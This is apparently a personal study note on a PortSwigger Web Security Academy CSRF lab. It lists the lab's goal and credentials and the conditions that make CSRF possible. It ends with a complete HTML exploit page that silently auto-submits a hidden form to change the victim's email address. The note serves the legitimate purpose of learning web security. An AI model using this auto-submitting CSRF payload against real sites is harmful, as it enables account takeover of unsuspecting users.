---
tags:
  - APPRENTICE
Link:
  - "[[CSRF]]"
External Link:
  - https://portswigger.net/web-security/csrf/lab-no-defenses
---

# CSRF vulnerability with no defenses
---

- **Info:**
	- Vulnerable parameter - email change functionality
	- Goal - exploit the CSRF vulnerability to change the email address of the victim user
	- creds - `wiener:peter`

-  **Analysis:**
	- In order for CSRF attack to be possible:
		- A relevant action - ***email change functionality***
		- Cookie-based session handling - ***session cookie***
		- No unpredictable request parameters - ***satisfied***

 - **Craft exploit**
```html
<html>
	<body>
		<h1>Hello World!</h1>
		<iframe style="display: none" name="csrf-iframe"></iframe>
		<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe">
			<input type="hidden" name="email" value="anything@normal-user.net" >
		</form>
		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>
```

